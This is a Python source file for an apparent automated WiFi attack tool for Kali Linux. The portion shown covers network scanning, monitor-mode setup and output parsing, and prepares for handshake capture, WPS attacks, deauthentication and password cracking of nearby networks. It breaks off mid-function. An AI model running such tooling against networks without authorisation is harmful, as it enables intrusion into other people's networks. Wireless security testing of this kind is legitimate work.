# --- SubprocessHelper class for modular subprocess handling ---
class SubprocessHelper:
    """Helper class for running subprocess commands with timeout, error handling, and logging."""
    def __init__(self, logger=None):
        import logging
        self.logger = logger or logging.getLogger(__name__)

    def run(self, command, timeout=30):
        """Run a command with timeout. Returns (success, stdout, stderr)."""
        self.logger.debug(f"Executing command: {command}")
        import subprocess
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            try:
                stdout, stderr = process.communicate(timeout=timeout)
                success = process.returncode == 0
                if not success:
                    self.logger.warning(f"Command failed: {command}")
                    self.logger.warning(f"Error: {stderr}")
                return success, stdout, stderr
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                self.logger.warning(f"Command timed out after {timeout} seconds: {command}")
                return False, stdout, f"Command timed out after {timeout} seconds"
        except Exception as e:
            self.logger.error(f"Error executing command: {e}")
            return False, "", str(e)
# --- Main script starts here ---
#!/usr/bin/env python3
"""
Advanced WiFi Scanner for Kali Linux
Author: Kilo Code
Description: Powerful WiFi scanner that automatically captures nearby networks
using multiple tools with retry logic and automatic switching.

Features:
- Multiple scanning methods (airodump-ng, iwlist, nmcli)
- Automatic retry logic (3 attempts per network)
- WPS vulnerability detection
- Handshake capture automation
- Comprehensive logging and reporting
- Monitor mode management
- Network strength analysis
"""

import os
import sys
import time
import json
import subprocess
import signal
import re
import platform
import threading
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import argparse
import logging
import shutil
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class WiFiNetwork:
    """Data class to represent a WiFi network"""
    bssid: str
    essid: str
    channel: int
    power: int
    encryption: str
    cipher: str
    authentication: str
    wps: bool = False
    clients: List[str] = None
    handshake_captured: bool = False
    attempts: int = 0
    last_seen: str = ""
    password: str = None

    def __post_init__(self):
        if self.clients is None:
            self.clients = []

class WiFiScanner:
    def is_monitor_interface_valid(self):
        """Check if the monitor interface is valid and present in system interfaces."""
        if not self.monitor_interface:
            return False
        try:
            import os
            # Check if interface exists in /sys/class/net (Linux)
            net_path = f"/sys/class/net/{self.monitor_interface}"
            return os.path.exists(net_path)
        except Exception:
            return False

    def ensure_monitor_mode(self):
        """Ensure monitor mode is active and monitor_interface is valid. Restart if needed."""
        if not self.monitor_mode_active or not self.is_monitor_interface_valid():
            self.logger.info("Monitor interface is missing or invalid. Restarting monitor mode.")
            self.monitor_mode_active = False
            self.monitor_interface = None
            return self.start_monitor_mode()
        return True
    def get_tool_path(self, tool_name):
        """Return the absolute path to a tool, or None if not found."""
        import shutil
        return shutil.which(tool_name)
        
    def is_tool_available(self, tool_name):
        """Check if a tool is available in the system PATH"""
        return self.get_tool_path(tool_name) is not None
        
    def check_tools_availability(self, tools_list):
        """Check availability of multiple tools and return a dictionary of results"""
        results = {}
        for tool in tools_list:
            results[tool] = self.is_tool_available(tool)
        return results

    def run_tool(self, tool_name, args, timeout=30, version_arg="--version", version_regex=None):
        """Run a tool with arguments safely, adapting to version if needed. Returns (success, stdout, stderr)."""
        tool_path = self.get_tool_path(tool_name)
        if not tool_path:
            self.logger.error(f"Tool not found: {tool_name}")
            return False, "", f"Tool not found: {tool_name}"
        # Optionally check version
        version = None
        if version_arg:
            try:
                proc = subprocess.Popen([tool_path, version_arg], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                out, err = proc.communicate(timeout=5)
                if version_regex:
                    import re
                    m = re.search(version_regex, out)
                    if m:
                        version = m.group(1)
                else:
                    version = out.strip()
            except Exception:
                pass
        # Build command as list
        cmd = [tool_path] + args
        self.logger.debug(f"Running tool: {' '.join(cmd)}")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            timer = threading.Timer(timeout, proc.kill)
            try:
                timer.start()
                stdout, stderr = proc.communicate()
            finally:
                timer.cancel()
            success = proc.returncode == 0
            if not success:
                self.logger.warning(f"Tool failed: {' '.join(cmd)}")
                self.logger.warning(f"Error: {stderr}")
            return success, stdout, stderr
        except Exception as e:
            self.logger.error(f"Error running tool {tool_name}: {e}")
            return False, "", str(e)
    def normalize_signal(self, value):
        """Normalize signal strength value from various formats across different Linux distributions"""
        try:
            # Handle dBm (e.g., -45), percentage (e.g., 45/100), or plain int
            if isinstance(value, str):
                value = value.strip()
                # Handle percentage formats
                if '/100' in value:
                    value = value.split('/')[0]
                elif '%' in value:
                    value = value.replace('%', '')
                    # Convert percentage to dBm-like scale if it's positive
                    if int(value) > 0:
                        # Rough conversion: 100% ~ -40dBm, 1% ~ -95dBm
                        return int(((int(value) / 100) * 55) - 95)
                # Handle dBm formats
                if 'dBm' in value:
                    value = value.replace('dBm', '').strip()
                # Handle quality formats
                elif 'Quality=' in value:
                    quality_match = re.search(r'Quality=([0-9]+)/([0-9]+)', value)
                    if quality_match:
                        quality = int(quality_match.group(1))
                        max_quality = int(quality_match.group(2))
                        # Convert to percentage then to dBm-like scale
                        percentage = (quality / max_quality) * 100
                        return int(((percentage / 100) * 55) - 95)
                # Handle signal level formats
                elif 'Signal level=' in value:
                    level_match = re.search(r'Signal level=(-?[0-9]+)', value)
                    if level_match:
                        return int(level_match.group(1))
                return int(value)
            return int(value)
        except Exception as e:
            self.logger.debug(f"Error normalizing signal: {e}, value: {value}")
            return -100

    def normalize_channel(self, value):
        """Normalize channel value from various formats across different Linux distributions"""
        try:
            if isinstance(value, str):
                value = value.strip()
                # Handle channel prefix formats
                if value.startswith('CH:') or value.startswith('Channel:'):
                    value = re.search(r'(?:CH:|Channel:)\s*(\d+)', value).group(1)
                # Handle frequency formats
                elif 'GHz' in value or 'MHz' in value:
                    # Extract frequency value
                    freq_match = re.search(r'([\d.]+)\s*(?:GHz|MHz)', value)
                    if freq_match:
                        freq = float(freq_match.group(1))
                        # Convert MHz to GHz if needed
                        if 'MHz' in value:
                            freq /= 1000
                        # Convert frequency to channel using standard formula
                        if 2.4 <= freq <= 2.5:
                            return int(round((freq - 2.412) / 0.005 + 1))
                        elif 5.1 <= freq <= 5.9:
                            return int(round((freq - 5.170) / 0.005 + 34))
                # Handle hex format
                if value.startswith('0x'):
                    return int(value, 16)
                # Handle plain number
                return int(value)
            return int(value)
        except Exception as e:
            self.logger.debug(f"Error normalizing channel: {e}, value: {value}")
            return 0

    def normalize_essid(self, value):
        """Normalize ESSID, handle hidden and empty cases across different Linux distributions"""
        if not value:
            return "Hidden"
        
        # Handle various hidden ESSID formats
        if isinstance(value, str):
            value = value.strip()
            if value.lower() in ["", "<length: 0>", "<length:0>", "hidden", "--", "<hidden>", 
                               "<null>", "(hidden)", "*", "?", "unknown", "ssid", "<ssid>"]:
                return "Hidden"
            # Handle quoted formats
            if value.startswith('"') and value.endswith('"'):
                value = value[1:-1]
            # Handle hex encoded formats
            if value.startswith('\\x'):
                try:
                    # Try to decode hex string
                    hex_values = value.replace('\\x', '')
                    decoded = bytes.fromhex(hex_values).decode('utf-8', errors='replace')
                    if decoded.strip():
                        return decoded
                    return "Hidden"
                except:
                    pass
        return value
    """Advanced WiFi Scanner with multiple tool integration"""
    
    def __init__(self, interface: str = "wlan0", output_dir: str = "./wifi_scan_results", config_path: str = None, log_level: str = "INFO", dry_run: bool = False):
        self.interface = interface
        self.monitor_interface = None  # Will be set dynamically
        self.output_dir = output_dir
        self.networks: Dict[str, WiFiNetwork] = {}
        self.max_attempts = 3
        self.scan_duration = 30
        self.running = False
        self.monitor_mode_active = False
        self.config = {}
        self.wordlist_patterns = []
        self.log_level = log_level
        self.dry_run = dry_run  # Dry run mode for testing without actual attacks
        self.hashcat_potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
        
        # Default timeout values (in seconds)
        self.timeouts = {
            "scan": 60,
            "deauth": 30,
            "handshake": 120,
            "wps": 300,
            "crack": 600,
            "default": 30
        }

        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)

        # Setup logging first before using logger
        self.setup_logging()
        
        # Load config file if provided
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, "r") as f:
                    self.config = json.load(f)
                self.interface = self.config.get("interface", self.interface)
                self.output_dir = self.config.get("output_dir", self.output_dir)
                self.max_attempts = self.config.get("max_attempts", self.max_attempts)
                self.scan_duration = self.config.get("scan_duration", self.scan_duration)
                self.wordlist_patterns = self.config.get("wordlist_patterns", [])
                self.hashcat_potfile = self.config.get("hashcat_potfile", self.hashcat_potfile)
                self.log_level = self.config.get("log_level", self.log_level)
                
                # Load timeout configurations if available
                if "timeouts" in self.config:
                    for key, value in self.config["timeouts"].items():
                        if key in self.timeouts and isinstance(value, (int, float)):
                            self.timeouts[key] = value
            except Exception as e:
                self.logger.error(f"Error loading config file: {e}")
                # Continue with default values

        # Available scanning tools
        self.scanning_tools = {
            'airodump': self.scan_with_airodump,
            'iwlist': self.scan_with_iwlist,
            'nmcli': self.scan_with_nmcli,
            'wifite': self.scan_with_wifite
        }

        # Signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def setup_logging(self):
        """Setup comprehensive logging with verbosity control"""
        log_file = os.path.join(self.output_dir, f"wifi_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        level = getattr(logging, self.log_level.upper(), logging.INFO)
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        self.logger.info(f"Advanced WiFi Scanner initialized with log level {self.log_level}")
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully"""
        self.logger.info(f"Received signal {signum}, shutting down gracefully...")
        self.running = False
        self.cleanup()
        sys.exit(0)
    
    def run_command(self, command: str, timeout: int = None, operation_type: str = "default") -> Tuple[bool, str, str]:
        """Execute system command using SubprocessHelper.
        
        Args:
            command: The command to execute
            timeout: Optional timeout override in seconds
            operation_type: Type of operation (scan, deauth, handshake, wps, crack) for timeout selection
        """
        if not hasattr(self, '_subprocess_helper'):
            self._subprocess_helper = SubprocessHelper(self.logger)
            
        # Use provided timeout or get from timeouts dictionary based on operation type
        if timeout is None:
            timeout = self.timeouts.get(operation_type, self.timeouts["default"])
        
        # If in dry run mode, log the command but don't execute it
        if self.dry_run:
            self.logger.info(f"[DRY RUN] Would execute: {command}")
            return True, f"[DRY RUN] Simulated output for: {command}", ""
            
        return self._subprocess_helper.run(command, timeout)
    
    def check_dependencies(self) -> bool:
        """Check if required tools are installed and compatible"""
        # Define tools based on platform
        if platform.system() != "Linux":
            self.logger.warning("Running on a non-Linux platform. Some tools may not be available.")
            self.logger.info("Limited functionality will be available on non-Linux platforms.")
            return True  # Skip dependency check on non-Linux platforms
        
        # For Linux, check for required tools
        required_tools = [
            'aircrack-ng', 'airodump-ng', 'airmon-ng', 'aireplay-ng',
            'iwlist', 'nmcli', 'reaver', 'bully', 'wifite'
        ]
            
        # Use the modularized tool check method
        tool_availability = self.check_tools_availability(required_tools)
        missing_tools = [tool for tool, available in tool_availability.items() if not available]
                
        # Check wifite version if available
        wifite_version = 1
        if self.is_tool_available('wifite'):
            success, stdout, _ = self.run_command("wifite -h")
            if success and "--wps-only" in stdout:
                wifite_version = 2
                self.logger.info("Detected Wifite version 2")
            else:
                self.logger.info("Detected Wifite version 1")
        
        if missing_tools:
            self.logger.error(f"Missing required tools: {', '.join(missing_tools)}")
            
            # Detect Linux distribution for more specific instructions
            distro = ""
            distro_family = "unknown"
            
            if os.path.exists("/etc/os-release"):
                try:
                    with open("/etc/os-release", "r") as f:
                        os_release_content = f.read()
                        
                    # Extract ID and ID_LIKE for better distribution detection
                    id_match = re.search(r'ID=([^\n"]+)', os_release_content)
                    id_like_match = re.search(r'ID_LIKE=([^\n"]+)', os_release_content)
                    
                    if id_match:
                        distro = id_match.group(1).strip().strip('"')
                    
                    # Determine distribution family
                    if distro in ["kali", "ubuntu", "debian", "parrot"]:
                        distro_family = "debian"
                    elif distro in ["arch", "manjaro", "blackarch"]:
                        distro_family = "arch"
                    elif distro in ["fedora", "centos", "rhel"]:
                        distro_family = "rhel"
                    elif id_like_match:
                        id_like = id_like_match.group(1).strip().strip('"')
                        if any(d in id_like for d in ["debian", "ubuntu"]):
                            distro_family = "debian"
                        elif "arch" in id_like:
                            distro_family = "arch"
                        elif any(d in id_like for d in ["fedora", "rhel"]):
                            distro_family = "rhel"
                except Exception as e:
                    self.logger.warning(f"Could not detect Linux distribution: {e}")
            
            # Provide distribution-specific installation instructions
            if distro_family == "debian":
                self.logger.info(f"On {distro.capitalize()} (Debian-based), run: sudo apt-get install aircrack-ng wireless-tools network-manager reaver bully wifite")
            elif distro_family == "arch":
                self.logger.info(f"On {distro.capitalize()} (Arch-based), run: sudo pacman -S aircrack-ng wireless_tools networkmanager reaver bully wifite")
            elif distro_family == "rhel":
                self.logger.info(f"On {distro.capitalize()} (RHEL-based), run: sudo dnf install aircrack-ng wireless-tools NetworkManager reaver bully wifite")
            else:
                self.logger.info("Please install the missing tools using your distribution's package manager or run setup.sh")
            
            self.logger.info("You can also run the setup.sh script to install all dependencies automatically.")
            return False
        # Tool version checks (example for wifite)
        wifite_path = self.get_tool_path('wifite')
        if wifite_path:
            success, stdout, _ = self.run_command(f"{wifite_path} --version")
            if success:
                self.logger.info(f"Wifite version: {stdout.strip()}")
            else:
                self.logger.warning("Could not determine wifite version.")
        self.logger.info("All required tools are available and detected.")
        return True
    
    def start_monitor_mode(self) -> bool:
        """Start monitor mode on the wireless interface, dynamically detect monitor interface name"""
        if self.monitor_mode_active:
            self.logger.info("Monitor mode already active")
            return True

        self.logger.info(f"Starting monitor mode on {self.interface}")

        # Kill interfering processes
        success, _, _ = self.run_command("airmon-ng check kill")
        if not success:
            self.logger.warning("Failed to kill interfering processes")
            # Try alternative methods to kill interfering processes
            self.run_command("pkill wpa_supplicant")
            self.run_command("pkill NetworkManager")

        # Try to start monitor mode using airmon-ng
        success, stdout, stderr = self.run_command(f"airmon-ng start {self.interface}")
        if success:
            # Try to find the monitor interface name from stdout
            monitor_iface = None
            
            # Different distributions have different output formats
            # Try multiple patterns to extract monitor interface name
            
            # Pattern 1: Typical output on Kali/Ubuntu: "(mac80211 monitor mode vif enabled for [phyX]wlan0 on [phyX]wlan0mon)"
            match = re.search(r'on\s+([\w\d_-]+)\)?', stdout)
            if match:
                monitor_iface = match.group(1)
                self.logger.debug(f"Found monitor interface using pattern 1: {monitor_iface}")
            
            # Pattern 2: Look for lines mentioning "monitor mode enabled" and extract interface
            if not monitor_iface:
                for line in stdout.splitlines():
                    if "monitor mode enabled" in line.lower() or "monitor mode vif enabled" in line.lower():
                        m = re.search(r'on\s+([\w\d_-]+)', line)
                        if m:
                            monitor_iface = m.group(1)
                            self.logger.debug(f"Found monitor interface using pattern 2: {monitor_iface}")
                            break
            
            # Pattern 3: Look for interface ending with 'mon' in output
            if not monitor_iface:
                m = re.search(r'([\w\d_-]+mon)', stdout)
                if m:
                    monitor_iface = m.group(1)
                    self.logger.debug(f"Found monitor interface using pattern 3: {monitor_iface}")
            
            # Pattern 4: Some distributions just rename the interface to the same name
            # Check if the original interface is now in monitor mode
            if not monitor_iface:
                success, iw_stdout, _ = self.run_command(f"iwconfig {self.interface}")
                if success and "Mode:Monitor" in iw_stdout:
                    monitor_iface = self.interface
                    self.logger.debug(f"Original interface is now in monitor mode: {monitor_iface}")
            
            # If we found a monitor interface, use it
            if monitor_iface:
                self.monitor_interface = monitor_iface
                self.monitor_mode_active = True
                self.logger.info(f"Monitor mode started successfully on {self.monitor_interface}")
                return True
            else:
                # If airmon-ng didn't work, try alternative methods
                self.logger.warning("Could not detect monitor interface name from airmon-ng output. Trying alternative methods.")
                
                # Try using iw command (works on most modern distributions)
                success, _, _ = self.run_command(f"ip link set {self.interface} down")
                if success:
                    success, _, _ = self.run_command(f"iw {self.interface} set monitor control")
                    if success:
                        success, _, _ = self.run_command(f"ip link set {self.interface} up")
                        if success:
                            # Check if interface is in monitor mode
                            success, iw_stdout, _ = self.run_command(f"iwconfig {self.interface}")
                            if success and "Mode:Monitor" in iw_stdout:
                                self.monitor_interface = self.interface
                                self.monitor_mode_active = True
                                self.logger.info(f"Monitor mode started using iw on {self.monitor_interface}")
                                return True
                
                self.logger.error(f"Failed to start monitor mode on {self.interface}")
                return False
        else:
            self.logger.error(f"Failed to start monitor mode: {stderr}")
            return False
    
    def stop_monitor_mode(self) -> bool:
        """Stop monitor mode and restore normal operation"""
        if not self.monitor_mode_active:
            return True
        
        self.logger.info(f"Stopping monitor mode on {self.monitor_interface}")
        
        success, _, _ = self.run_command(f"airmon-ng stop {self.monitor_interface}")
        if success:
            self.monitor_mode_active = False
            # Restart network manager
            self.run_command("service network-manager restart")
            self.logger.info("Monitor mode stopped successfully")
            return True
        else:
            self.logger.error("Failed to stop monitor mode")
            return False
    
    def scan_with_airodump(self, duration: int = 30) -> List[WiFiNetwork]:
        """Scan networks using airodump-ng (safe command construction, monitor mode validation)"""
        self.logger.info(f"Scanning with airodump-ng for {duration} seconds")
        if not self.ensure_monitor_mode():
            return []
        output_file = os.path.join(self.output_dir, f"airodump_scan_{int(time.time())}")
        args = [self.monitor_interface, '-w', output_file, '--output-format', 'csv']
        timeout_path = self.get_tool_path('timeout')
        if timeout_path:
            cmd = [timeout_path, str(duration), self.get_tool_path('airodump-ng')] + args
        else:
            cmd = [self.get_tool_path('airodump-ng')] + args
        self.logger.debug(f"Running airodump-ng: {' '.join(cmd)}")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            # Use a different approach for timeout
            try:
                stdout, stderr = proc.communicate(timeout=duration+5)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, stderr = proc.communicate()
        except Exception as e:
            self.logger.error(f"Error running airodump-ng: {e}")
        networks = []
        csv_file = f"{output_file}-01.csv"
        if os.path.exists(csv_file):
            networks = self.parse_airodump_csv(csv_file)
            self.logger.info(f"Found {len(networks)} networks with airodump-ng")
        return networks
    
    def parse_airodump_csv(self, csv_file: str) -> List[WiFiNetwork]:
        """Parse airodump-ng CSV output"""
        networks = []
        
        try:
            with open(csv_file, 'r') as f:
                content = f.read()
            
            # Split into networks and clients sections
            sections = content.split('\n\n')
            if len(sections) < 1:
                return networks
            
            network_lines = sections[0].split('\n')[1:]  # Skip header
            
            for line in network_lines:
                if not line.strip():
                    continue
                
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    try:
                        network = WiFiNetwork(
                            bssid=parts[0],
                            essid=parts[13] if parts[13] else "Hidden",
                            channel=int(parts[3]) if parts[3].isdigit() else 0,
                            power=int(parts[8]) if parts[8].lstrip('-').isdigit() else -100,
                            encryption=parts[5],
                            cipher=parts[6],
                            authentication=parts[7],
                            wps="WPS" in parts[7],
                            last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        )
                        networks.append(network)
                    except (ValueError, IndexError) as e:
                        self.logger.debug(f"Error parsing network line: {e}")
                        continue
        
        except Exception as e:
            self.logger.error(f"Error parsing airodump CSV: {e}")
        
        return networks
    
    def scan_with_iwlist(self) -> List[WiFiNetwork]:
        """Scan networks using iwlist with normalization"""
        self.logger.info("Scanning with iwlist")
        success, stdout, stderr = self.run_command(f"iwlist {self.interface} scan")
        if not success:
            self.logger.debug(f"iwlist scan failed: {stderr}")
            return []
        
        networks = []
        current_network = {}
        
        for line in stdout.split('\n'):
            line = line.strip()
            
            # Handle different Cell formats across distributions
            if ('Cell' in line and 'Address:' in line) or ('Cell' in line and '-' in line and ':' in line):
                # Save previous network if exists
                if current_network and 'bssid' in current_network:
                    networks.append(self.create_network_from_iwlist(current_network))
                    
                # Extract BSSID using regex to handle different formats
                bssid_match = re.search(r'([0-9A-Fa-f:]{17})', line)
                if bssid_match:
                    current_network = {'bssid': bssid_match.group(1)}
                else:
                    current_network = {}
                    
            # Handle ESSID with different formats
            elif 'ESSID:' in line:
                try:
                    if '"' in line:
                        essid = line.split('ESSID:')[1].strip().strip('"')
                    else:
                        essid = line.split('ESSID:')[1].strip()
                        
                    # Normalize hidden ESSID with more patterns
                    if not essid or essid.lower() in ["", "<length: 0>", "hidden", "--", "<null>"]:
                        essid = "Hidden"
                    current_network['essid'] = essid
                except Exception as e:
                    self.logger.debug(f"Error parsing ESSID: {e}")
                    current_network['essid'] = "Hidden"
                    
            # Handle Channel with different formats
            elif 'Channel:' in line or 'channel' in line.lower():
                try:
                    if ':' in line:
                        ch = line.split(':')[1].strip()
                    else:
                        ch_match = re.search(r'channel\s*(\d+)', line.lower())
                        if ch_match:
                            ch = ch_match.group(1)
                        else:
                            continue
                            
                    # Normalize channel (hex or int)
                    if ch.startswith('0x'):
                        current_network['channel'] = int(ch, 16)
                    else:
                        current_network['channel'] = int(ch)
                except Exception as e:
                    self.logger.debug(f"Error parsing channel: {e}")
                    current_network['channel'] = 0
                    
            # Handle Frequency (some distributions show frequency instead of channel)
            elif 'Frequency:' in line or 'frequency' in line.lower():
                try:
                    freq_match = re.search(r'([\d.]+)\s*GHz', line)
                    if freq_match:
                        freq = float(freq_match.group(1))
                        # Convert frequency to channel using standard formula
                        if 2.4 <= freq <= 2.5:
                            current_network['channel'] = int(round((freq - 2.412) / 0.005 + 1))
                        elif 5.1 <= freq <= 5.9:
                            current_network['channel'] = int(round((freq - 5.170) / 0.005 + 34))
                        else:
                            current_network['channel'] = 0
                except Exception as e:
                    self.logger.debug(f"Error parsing frequency: {e}")
                    
            # Handle Signal level with different formats
            elif 'Signal level' in line or 'Quality' in line:
                try:
                    # Handle dBm format
                    if 'dBm' in line:
                        dbm_match = re.search(r'Signal level=\s*([-\d]+)\s*dBm', line)
                        if dbm_match:
                            current_network['power'] = int(dbm_match.group(1))
                    # Handle quality percentage format
                    elif 'Quality' in line and '/' in line:
                        quality_match = re.search(r'Quality=\s*(\d+)/(\d+)', line)
                        if quality_match:
                            quality = int(quality_match.group(1))
                            max_quality = int(quality_match.group(2))
                            # Convert to percentage
                            current_network['power'] = int((quality / max_quality) * 100)
                    # Handle direct signal level format
                    elif 'Signal level=' in line:
                        val = line.split('Signal level=')[1].split(' ')[0]
                        if '/' in val:
                            val = val.split('/')[0]
                        current_network['power'] = int(val)
                except Exception as e:
                    self.logger.debug(f"Error parsing signal: {e}")
                    current_network['power'] = -100
                    
            # Handle Encryption with different formats
            elif 'Encryption key:' in line or 'key:' in line.lower():
                try:
                    if 'on' in line.lower():
                        # Default to WEP, will be updated if WPA/WPA2 is found
                        current_network['encryption'] = 'WEP'
                    else:
                        current_network['encryption'] = 'Open'
                except Exception as e:
                    self.logger.debug(f"Error parsing encryption: {e}")
                    current_network['encryption'] = 'Unknown'
                    
            # Handle different WPA/WPA2/WPA3 formats
            elif 'WPA3' in line or 'SAE' in line:
                current_network['encryption'] = 'WPA3'
                current_network['authentication'] = 'SAE' if 'SAE' in line else 'Unknown'
            elif 'WPA2' in line or 'IEEE 802.11i' in line and 'WPA' not in line:
                current_network['encryption'] = 'WPA2'
            elif 'WPA' in line and 'WPA2' not in line and 'WPA3' not in line:
                current_network['encryption'] = 'WPA'
                
            # Handle Authentication
            elif 'Authentication Suites' in line:
                if 'PSK' in line:
                    current_network['authentication'] = 'PSK'
                elif 'EAP' in line:
                    current_network['authentication'] = 'EAP'
                    
            # Handle Cipher
            elif 'Pairwise Ciphers' in line or 'Group Cipher' in line:
                if 'CCMP' in line:
                    current_network['cipher'] = 'CCMP'
                elif 'TKIP' in line:
                    current_network['cipher'] = 'TKIP'
        
        # Add the last network if exists
        if current_network and 'bssid' in current_network:
            networks.append(self.create_network_from_iwlist(current_network))
            
        self.logger.info(f"Found {len(networks)} networks with iwlist")
        return networks
    
    def create_network_from_iwlist(self, data: dict) -> WiFiNetwork:
        """Create WiFiNetwork object from iwlist data"""
        return WiFiNetwork(
            bssid=data.get('bssid', ''),
            essid=data.get('essid', 'Hidden'),
            channel=data.get('channel', 0),
            power=data.get('power', -100),
            encryption=data.get('encryption', 'Unknown'),
            cipher='Unknown',
            authentication='Unknown',
            last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        )
    
    def scan_with_nmcli(self) -> List[WiFiNetwork]:
        """Scan networks using nmcli with normalization"""
        self.logger.info("Scanning with nmcli")
        # Use more explicit format to handle different nmcli versions
        success, stdout, _ = self.run_command("nmcli -t -f BSSID,SSID,CHAN,RATE,SIGNAL,SECURITY device wifi list")
        if not success:
            # Fallback to standard command if fields format fails
            success, stdout, _ = self.run_command("nmcli dev wifi list")
            if not success:
                return []
        
        networks = []
        lines = stdout.split('\n')
        
        # Check if we're using tabular format or field format
        if ':' in lines[0] and stdout.startswith('BSSID:SSID:'):
            # Field format (newer nmcli versions)
            for line in lines[1:]:  # Skip header
                if not line.strip():
                    continue
                try:
                    parts = line.split(':')
                    if len(parts) >= 5:
                        bssid = parts[0].strip()
                        essid = parts[1].strip()
                        # Normalize hidden ESSID
                        if not essid or essid.lower() in ["", "<length: 0>", "hidden", "--"]:
                            essid = "Hidden"
                        # Normalize channel
                        try:
                            channel = int(parts[2])
                        except:
                            channel = 0
                        # Normalize power
                        try:
                            power = int(parts[4])
                        except:
                            power = -100
                        # Security might be in field 5 or 6 depending on version
                        encryption = 'Unknown'
                        if len(parts) > 5:
                            encryption = parts[5] if parts[5] else 'Unknown'
                        
                        network = WiFiNetwork(
                            bssid=bssid,
                            essid=essid,
                            channel=channel,
                            power=power,
                            encryption=encryption,
                            cipher='Unknown',
                            authentication='Unknown',
                            last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        )
                        networks.append(network)
                except (ValueError, IndexError) as e:
                    self.logger.debug(f"Error parsing nmcli line: {e}")
                    continue
        else:
            # Standard tabular format
            for line in lines[1:]:  # Skip header
                if not line.strip():
                    continue
                try:
                    # Handle different nmcli output formats
                    parts = line.split()
                    if len(parts) < 6:
                        continue
                        
                    # Handle the '*' indicator for connected networks
                    offset = 0
                    if parts[0] == '*':
                        offset = 1
                        
                    # Extract BSSID (MAC address format validation)
                    bssid_idx = 0 + offset
                    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', parts[bssid_idx]):
                        # If not a MAC address, try next field
                        bssid_idx = 1 + offset
                        if len(parts) <= bssid_idx or not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', parts[bssid_idx]):
                            continue  # No valid BSSID found
                    
                    bssid = parts[bssid_idx]
                    essid_idx = bssid_idx + 1
                    
                    # ESSID might be multiple words, so we need to find where it ends
                    # Look for fields that are definitely not part of ESSID
                    essid_end = essid_idx
                    for i in range(essid_idx + 1, len(parts)):
                        # If we find a field that looks like a number (channel) or signal strength
                        if parts[i].isdigit() or parts[i].endswith('Mbit/s') or parts[i].endswith('%'):
                            essid_end = i
                            break
                    
                    # If we couldn't determine ESSID end, use a safe default
                    if essid_end == essid_idx:
                        essid = parts[essid_idx]
                    else:
                        essid = ' '.join(parts[essid_idx:essid_end])
                    
                    # Normalize hidden ESSID
                    if not essid or essid.lower() in ["", "<length: 0>", "hidden", "--"]:
                        essid = "Hidden"
                    
                    # Find channel and signal strength
                    channel = 0
                    power = -100
                    encryption = 'Unknown'
                    
                    # Look for channel (usually a number)
                    for i in range(essid_end, len(parts)):
                        if parts[i].isdigit() or (parts[i].startswith('0x') and len(parts[i]) > 2):
                            try:
                                if parts[i].startswith('0x'):
                                    channel = int(parts[i], 16)
                                else:
                                    channel = int(parts[i])
                                break
                            except:
                                pass
                    
                    # Look for signal strength (usually ends with %)
                    for i in range(essid_end, len(parts)):
                        if parts[i].endswith('%'):
                            try:
                                power = int(parts[i].rstrip('%'))
                                break
                            except:
                                pass
                    
                    # Look for encryption type
                    for i in range(essid_end, len(parts)):
                        if parts[i] in ['WEP', 'WPA', 'WPA1', 'WPA2', 'WPA3', 'OWE', 'SAE']:
                            encryption = parts[i]
                            break
                    
                    network = WiFiNetwork(
                        bssid=bssid,
                        essid=essid,
                        channel=channel,
                        power=power,
                        encryption=encryption,
                        cipher='Unknown',
                        authentication='Unknown',
                        last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    )
                    networks.append(network)
                except (ValueError, IndexError) as e:
                    self.logger.debug(f"Error parsing nmcli line: {e}")
                    continue
        self.logger.info(f"Found {len(networks)} networks with nmcli")
        return networks
    
    def scan_with_wifite(self) -> List[WiFiNetwork]:
        """Scan networks using wifite with safe, version-aware command construction"""
        self.logger.info("Scanning with wifite (dynamic arguments and version check)")
        if not self.ensure_monitor_mode():
            return []
        # Detect wifite version
        wifite_path = self.get_tool_path('wifite')
        wifite_version = None
        version_regex = r'(\d+\.\d+\.\d+)'
        if wifite_path:
            try:
                # Try multiple ways to get version
                proc = subprocess.Popen([wifite_path, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                out, err = proc.communicate(timeout=5)
                m = re.search(version_regex, out)
                if m:
                    wifite_version = m.group(1)
                else:
                    # Try stderr if stdout didn't work
                    m = re.search(version_regex, err)
                    if m:
                        wifite_version = m.group(1)
                    else:
                        # Just use whatever we got
                        wifite_version = out.strip() or err.strip()
            except Exception as e:
                self.logger.debug(f"Error detecting wifite version: {e}")
                pass
        self.logger.info(f"Detected wifite version: {wifite_version}")
        
        # Build dynamic arguments
        scan_time = self.scan_duration if hasattr(self, 'scan_duration') else 30
        iface = self.monitor_interface
        wordlist_arg = []
        if self.wordlist_patterns:
            try:
                temp_wordlist = os.path.join(self.output_dir, "wifite_temp_wordlist.txt")
                with open(temp_wordlist, "w") as f:
